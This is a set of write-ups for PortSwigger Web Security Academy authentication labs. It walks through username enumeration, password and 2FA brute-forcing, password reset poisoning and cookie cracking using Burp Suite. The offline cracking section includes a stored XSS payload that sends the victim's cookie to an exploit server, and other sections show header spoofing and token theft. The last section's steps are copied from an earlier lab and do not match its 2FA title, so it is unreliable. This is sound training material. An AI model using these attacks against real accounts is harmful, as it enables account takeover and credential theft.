# Authentication

## Username enumeration via different responses

### Description

[This lab](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses) is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable [username](https://portswigger.net/web-security/authentication/auth-lab-usernames) and [password](https://portswigger.net/web-security/authentication/auth-lab-passwords).

### Proof of concept

1. With Burp running, investigate the login page and submit an invalid username and password.
2. In Burp, go to Proxy > HTTP history and find the ``POST /login`` request. Send this to Burp Intruder.
3. In Burp Intruder, go to the Positions tab. Make sure that the Sniper attack type is selected.
4. Click Clear § to remove any automatically assigned payload positions. Highlight the value of the username parameter and click Add § to set it as a payload position. This position will be indicated by two § symbols, for example: ``username=§invalid-username§``. Leave the password as any static value for now.
5. On the Payloads tab, make sure that the Simple list payload type is selected.
6. Under Payload options, paste the list of candidate usernames. Finally, click Start attack. The attack will start in a new window.
7. When the attack is finished, on the Results tab, examine the Length column. You can click on the column header to sort the results. Notice that one of the entries is longer than the others. Compare the response to this payload with the other responses. Notice that other responses contain the message ``Invalid username``, but this response says ``Incorrect password``. Make a note of the username in the Payload column.
8. Close the attack and go back to the Positions tab. Click Clear, then change the ``username`` parameter to the username you just identified. Add a payload position to the `password` parameter. The result should look something like this:

```
username=identified-user&password=§invalid-password§
```

9. On the Payloads tab, clear the list of usernames and replace it with the list of candidate passwords. Click Start attack.
10. When the attack is finished, look at the Status column. Notice that each request received a response with a ``200`` status code except for one, which got a ``302`` response. This suggests that the login attempt was successful - make a note of the password in the Payload column.
11. Log in using the username and password that you identified and access the user account page to solve the lab.

### Exploitability

An attacker will need to enumerate a valid username, brute-force this user's password, then access their account page.

----

## 2FA simple bypass

### Description

[This lab](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass)'s two-factor authentication can be bypassed. You have already obtained a valid username and password (`wiener:peter` and `carlos:montoya`), but do not have access to the user's 2FA verification code.  

### Proof of concept

1. Log in to your own account. Your 2FA verification code will be sent to you by email. Click the **Email client** button to access your emails.
2. Go to your account page and make a note of the URL.
3. Log out of your account.
4. Log in using the victim's credentials.
5. When prompted for the verification code, manually change the URL to navigate to ``/my-account``. The lab is solved when the page loads.

### Exploitability

An attacker will need to access Carlos's account page.

----

## Password reset broken logic

### Description

[This lab](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)'s password reset functionality is vulnerable.   

### Proof of concept

1. With Burp running, click the Forgot your password? link and enter your own username.
2. Click the Email client button to view the password reset email that was sent. Click the link in the email and reset your password to whatever you want.
3. In Burp, go to Proxy > HTTP history and study the requests and responses for the password reset functionality. Observe that the reset token is provided as a URL query parameter in the reset email. Notice that when you submit your new password, the ``POST /forgot-password?temp-forgot-password-token`` request contains the username as hidden input. Send this request to Burp Repeater.
4. In Burp Repeater, observe that the password reset functionality still works even if you delete the value of the ``temp-forgot-password-token parameter`` in both the URL and request body. This confirms that the token is not being checked when you submit the new password.
5. In your browser, request a new password reset and change your password again. Send the ``POST /forgot-password?temp-forgot-password-token`` request to Burp Repeater again.
6. In Burp Repeater, delete the value of the ``temp-forgot-password-token`` parameter in both the URL and request body. Change the ``username`` parameter to ``carlos``. Set the new password to whatever you want and send the request.
7. In your browser, log in to Carlos's account using the new password you just set. Click My account to solve the lab.

### Exploitability

An attacker will need to log into `wiener:peter`, reset Carlos's password then log in and access his "My account" page.

----

## Username enumeration via subtly different responses

### Description

[This lab](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses) is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable [username](https://portswigger.net/web-security/authentication/auth-lab-usernames) and [password](https://portswigger.net/web-security/authentication/auth-lab-passwords).

### Proof of concept

1. With Burp running, submit an invalid username and password. Send the ``POST /login`` request to Burp Intruder and add a payload position to the ``username`` parameter.
2. On the Payloads tab, make sure that the Simple list payload type is selected and add the list of candidate usernames.
3. On the Options tab, under Grep - Extract, click Add. In the dialog that appears, scroll down through the response until you find the error message ``Invalid username or password..`` Use the mouse to highlight the text content of the message. The other settings will be automatically adjusted. Click OK and then start the attack.
4. When the attack is finished, notice that there is an additional column containing the error message you extracted. Sort the results using this column to notice that one of them is subtly different.
5. Look closer at this response and notice that it contains a typo in the error message - instead of a full stop/period, there is a trailing space. Make a note of this username.
6. Close the attack and go back to the Positions tab. Insert the username you just identified and add a payload position to the ``password`` parameter:

```
username=identified-user&password=§invalid-password§
```

7. On the Payloads tab, clear the list of usernames and replace it with the list of passwords. Start the attack.
8. When the attack is finished, notice that one of the requests received a ``302`` response. Make a note of this password.
9. Log in using the username and password that you identified and access the user account page to solve the lab.

### Exploitability

An attacker will need to enumerate a valid username, brute-force this user's password, then access their account page. 

----

## Username enumeration via response timing

### Description

[This lab](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing) is vulnerable to username enumeration using its response times. 

### Proof of concept

1. With Burp running, submit an invalid username and password, then send the ``POST /login`` request to Burp Repeater. Experiment with different usernames and passwords. Notice that your IP will be blocked if you make too many invalid login attempts.
2. Identify that the ``X-Forwarded-For`` header is supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection.
3. Continue experimenting with usernames and passwords. Pay particular attention to the response times. Notice that when the username is invalid, the response time is roughly the same. However, when you enter a valid username (your own), the response time is increased depending on the length of the password you entered.
4. Send this request to Burp Intruder and select the attack type to Pitchfork. Clear the default payload positions and add the ``X-Forwarded-For`` header.
5. Add payload positions for the ``X-Forwarded-For`` header and the ``username`` parameter. Set the password to a very long string of characters (about 100 characters should do it).
6. On the Payloads tab, select payload set 1. Select the Numbers payload type. Enter the range 1 - 100 and set the step to 1. Set the max fraction digits to 0. This will be used to spoof your IP.
7. Select payload set 2 and add the list of usernames. Start the attack.
8. When the attack finishes, at the top of the dialog, click Columns and select the Response received and Response completed options. These two columns are now displayed in the results table.
9. Notice that one of the response times was significantly longer than the others. Repeat this request a few times to make sure it consistently takes longer, then make a note of this username.
10. Create a new Burp Intruder attack for the same request. Add the ``X-Forwarded-For`` header again and add a payload position to it. Insert the username that you just identified and add a payload position to the ``password`` parameter.
11. On the Payloads tab, add the list of numbers in payload set 1 and add the list of passwords to payload set 2. Start the attack.
12. When the attack is finished, find the response with a ``302`` status. Make a note of this password.
13. Log in using the username and password that you identified and access the user account page to solve the lab.

### Exploitability

An attacker will need to log into `wiener:peter`, and enumerate a valid [username](https://portswigger.net/web-security/authentication/auth-lab-usernames), brute-force this user's [password](https://portswigger.net/web-security/authentication/auth-lab-passwords), then access their account page. 

----

## Broken brute-force protection, IP block

### Description

[This lab](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block) is vulnerable due to a logic flaw in its password brute-force protection.

### Proof of concept

1. With Burp running, investigate the login page. Observe that your IP is temporarily blocked if you submit 3 incorrect logins in a row. However, notice that you can reset the counter for the number of failed login attempts by logging in to your own account before this limit is reached.
2. Enter an invalid username and password, then send the ``POST /login`` request to Burp Intruder. Create a pitchfork attack with payload positions in both the ``username`` and ``password`` parameters.
3. On the Payloads tab, select payload set 1. Add a list of payloads that alternates between your username and ``carlos``. Make sure that your username is first and that ``carlos`` is repeated at least 100 times.
4. Edit the list of candidate passwords and add your own password before each one. Make sure that your password is aligned with your username in the other list.
5. Add this list to payload set 2 and start the attack.
6. When the attack finishes, filter the results to hide responses with a 200 status code. Sort the remaining results by username. There should only be a single 302 response for requests with the username ``carlos``. Make a note of the password from the Payload 2 column.
7. Log in to Carlos's account using the password that you identified and access his account page to solve the lab.

### Exploitability

An attacker will need to log into `wiener:peter`, brute-force the carlos's [password](https://portswigger.net/web-security/authentication/auth-lab-passwords), then log in and access his account page. 

----

## Username enumeration via account lock

### Description

[This lab](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock) is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw.

### Proof of concept

1. With Burp running, investigate the login page and submit an invalid username and password. Send the ``POST /login`` request to Burp Intruder.
2. Select the attack type Cluster bomb. Add a payload position to the ``username`` parameter. Add a blank payload position to the end of the request body by clicking Add § twice. The result should look something like this:

```
username=§invalid-username§&password=example§§
```

3. On the Payloads tab, add the list of usernames to the first payload set. For the second set, select the Null payloads type and choose the option to generate 5 payloads. This will effectively cause each username to be repeated 5 times. Start the attack.
4. In the results, notice that the responses for one of the usernames were longer than responses when using other usernames. Study the response more closely and notice that it contains a different error message: ``You have made too many incorrect login attempts``. Make a note of this username.
5. Create a new Burp Intruder attack on the ``POST /login`` request, but this time select the Sniper attack type. Set the ``username`` parameter to the username that you just identified and add a payload position to the ``password`` parameter.
6. Add the list of passwords to the payload set and create a grep extraction rule for the error message. Start the attack.
7. In the results, look at the grep extract column. Notice that there are a couple of different error messges, but one of the responses did not contain any error message. Make a note of this password.
8. Wait for a minute to allow the account lock to reset. Log in using the username and password that you identified and access the user account page to solve the lab.

### Exploitability

An attacker will need to enumerate a valid [username](https://portswigger.net/web-security/authentication/auth-lab-usernames), brute-force this user's [password](https://portswigger.net/web-security/authentication/auth-lab-passwords), then access their account page. 

----

## 2FA broken logic

### Description

[This lab](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)'s two-factor authentication is vulnerable due to its flawed logic. 

### Proof of concept

1. With Burp running, log in to your own account and investigate the 2FA verification process. Notice that in the ``POST /login2`` request, the ``verify`` parameter is used to determine which user's account is being accessed.
2. Log out of your account.
3. Send the ``GET /login2`` request to Burp Repeater. Change the value of the ``verify`` parameter to ``carlos`` and send the request. This ensures that a temporary 2FA code is generated for Carlos.
4. Go to the login page and enter your username and password. Then, submit an invalid 2FA code.
5. Send the ``POST /login2`` request to Burp Intruder.
6. In Burp Intruder, set the ``verify`` parameter to ``carlos`` and add a payload position to the mfa-code parameter. Brute-force the verification code.
7. Load the 302 response in your browser.
8. Click My account to solve the lab.

### Exploitability

An attacker will need to make sure a MFA-code verification code is generated for user ``carlos`` by issuing a GET request to ``login2``, then bruteforce the POST request to ``login2`` using the *Payload type: Brute forcer*

----

## Brute-forcing a stay-logged-in cookie

### Description

[This lab](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie) allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing. 

### Proof of concept

1. With Burp running, log in to your own account with the Stay logged in option selected. Notice that this sets a ``stay-logged-in`` cookie.
2. Examine this cookie in the Inspector panel and notice that it is Base64-encoded. Its decoded value is ``wiener:51dc30ddc473d43a6011e9ebba6ca770``. Study the length and character set of this string and notice that it could be an MD5 hash. Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows:

```
base64(username+':'+md5HashOfPassword)
```

3. Log out of your account.
4. Send the most recent ``GET /my-account`` request to Burp Intruder.
5. In Burp Intruder, add a payload position to the ``stay-logged-in`` cookie and add your own password as a single payload.
6. Under Payload processing, add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted.
- Hash: ``MD5``
- Add prefix: ``wiener:``
- Encode: ``Base64-encode``
7. As the Update email button is only displayed when you access the ``/my-account`` page in an authenticated state, we can use the presence or absence of this button to determine whether we've successfully brute-forced the cookie. On the Options tab, add a grep match rule to flag any responses containing the string ``Update email``. Start the attack.
8. Notice that the generated payload was used to successfully load your own account page. This confirms that the payload processing rules work as expected and you were able to construct a valid cookie for your own account.
9. Make the following adjustments and then repeat this attack:
- Remove your own password from the payload list and add the list of candidate passwords instead.
- Change the Add prefix rule to add ``carlos:`` instead of ``wiener:``.
10. When the attack is finished, the lab will be solved. Notice that only one request returned a response containing ``Update email``. The payload from this request is the valid ``stay-logged-in`` cookie for Carlos's account.

### Exploitability

An attacker can log in to `wiener:peter` and brute-force Carlos's cookie to gain access to his "My account" page. 

----

## Offline password cracking

### Description

[This lab](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking) stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality.

### Proof of concept

1. With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the ``stay-logged-in`` cookie is Base64 encoded.
2. In the Proxy > HTTP history tab, go to the Response to your login request and highlight the ``stay-logged-in`` cookie, to see that it is constructed as follows:

```
username+':'+md5HashOfPassword
```

3. You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
4. Go to the exploit server and make a note of the URL.
5. Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID:

```
<script>document.location='//your-exploit-server-id.web-security-academy.net/'+document.cookie</script>
```

6. On the exploit server, open the access log. There should be a GET request from the victim containing their ``stay-logged-in`` cookie.
7. Decode the cookie in Burp Decoder. The result will be:

```
carlos:26323c16d5f4dabff3bb136f2460a943
```

8. Copy the hash and paste it into a search engine. This will reveal that the password is ``onceuponatime``.
9. Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.

### Exploitability

An attacker will need to obtain Carlos's `stay-logged-in` cookie and use it to crack his password;then log in as `carlos` and delete his account from the "My account" page. 

----

## Password reset poisoning via middleware

### Description

[This lab](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware) is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives.

### Proof of concept

1. With Burp running, investigate the password reset functionality. Observe that a link containing a unique reset token is sent via email.
2. Send the ``POST /forgot-password`` request to Burp Repeater. Notice that the ``X-Forwarded-Host`` header is supported and you can use it to point the dynamically generated reset link to an arbitrary domain.
3. Go to the exploit server and make a note of your exploit server URL.
4. Go back to the request in Burp Repeater and add the ``X-Forwarded-Host`` header with your exploit server URL:

```
X-Forwarded-Host: your-exploit-server-id.web-security-academy.net
```

5. Change the ``username`` parameter to ``carlos`` and send the request.
6. Go to the exploit server and open the access log. You should see a ``GET /forgot-password`` request, which contains the victim's token as a query parameter. Make a note of this token.
7. Go back to your email client and copy the valid password reset link (not the one that points to the exploit server). Paste this into your browser and change the value of the ``temp-forgot-password-token`` parameter to the value that you stole from the victim.
8. Load this URL and set a new password for Carlos's account.
9. Log in to Carlos's account using the new password to solve the lab.

### Exploitability

An attacker can log in to `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server. The attacker will need to log in to Carlos's account.  

----

## Password brute-force via password change

### Description

[This lab](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)'s password change functionality makes it vulnerable to brute-force attacks. 

### Proof of concept

1. With Burp running, log in and experiment with the password change functionality. Observe that the username is submitted as hidden input in the request.
2. Notice the behaviour when you enter the wrong current password. If the two entries for the new password match, the account is locked. However, if you enter two different new passwords, an error message simply states `Current password is incorrect`. If you enter a valid current password, but two different new passwords, the message says `New passwords do not match`. We can use this message to enumerate correct passwords.
3. Enter your correct current password and two new passwords that do not match. Send this `POST /my-account/change-password` request to Burp Intruder.
4. In Burp Intruder, change the username parameter to carlos and add a payload position to the current-password parameter. Make sure that the new password parameters are set to two different values. For example:

```
username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc
```
    
5. On the Payloads tab, enter the list of passwords as the payload set
6. On the Options tab, add a grep match rule to flag responses containing New passwords do not match. Start the attack.
7. When the attack finishes, notice that one response was found that contains the New passwords do not match message. Make a note of this password.
8. In the browser, log out of your own account and lock back in with the username carlos and the password that you just identified.
9. Click My account to solve the lab.

### Exploitability

An attacker will need to log in using `wiener:peter`, and use the [list of candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) to brute-force Carlos's account and access his "My account" page. 

----

## Broken brute-force protection, multiple credentials per request

### Description

[This lab](https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request) is vulnerable due to a logic flaw in its brute-force protection. 

### Proof of concept

1. With Burp running, investigate the login page. Notice that the `POST /login` request submits the login credentials in JSON format. Send this request to Burp Repeater.
2. In Burp Repeater, replace the single string value of the password with an array of strings containing all candidate passwords. For example:

```html
"username" : "carlos",
"password" : [
    "123456",
    "password",
    "qwerty"
    ...
]
```

3. Send the request. This will return a 302 response.
4. Right-click on this request and select Show response in browser. Copy the URL and load it in the browser. The page loads and you are logged in as carlos.
5. Click My account to access Carlos's account page and solve the lab.

### Exploitability

An attacker will need to brute-force Carlos's password, then access his account page. 

----

## 2FA bypass using a brute-force attack

### Description

[This lab](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack)'s two-factor authentication is vulnerable to brute-forcing.  

### Proof of concept

1. With Burp running, log in and experiment with the password change functionality. Observe that the username is submitted as hidden input in the request.
2. Notice the behaviour when you enter the wrong current password. If the two entries for the new password match, the account is locked. However, if you enter two different new passwords, an error message simply states ``Current password is incorrect``. If you enter a valid current password, but two different new passwords, the message says ``New passwords do not match``. We can use this message to enumerate correct passwords.
3. Enter your correct current password and two new passwords that do not match. Send this ``POST /my-account/change-password`` request to Burp Intruder.
4. In Burp Intruder, change the ``username`` parameter to ``carlos`` and add a payload position to the ``current-password`` parameter. Make sure that the new password parameters are set to two different values. For example:

```
username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc
```

5. On the Payloads tab, enter the list of passwords as the payload set
6. On the Options tab, add a grep match rule to flag responses containing ``New passwords do not match``. Start the attack.
7. When the attack finished, notice that one response was found that contains the ``New passwords do not match`` message. Make a note of this password.
8. In your browser, log out of your own account and lock back in with the username ``carlos`` and the password that you just identified.
9. Click My account to solve the lab.

### Exploitability

An attacker has already obtained a valid username and password (`carlos:montoya`), but does not have access to the user's 2FA verification code. The attacker will need to brute-force the 2FA code and access Carlos's account page.

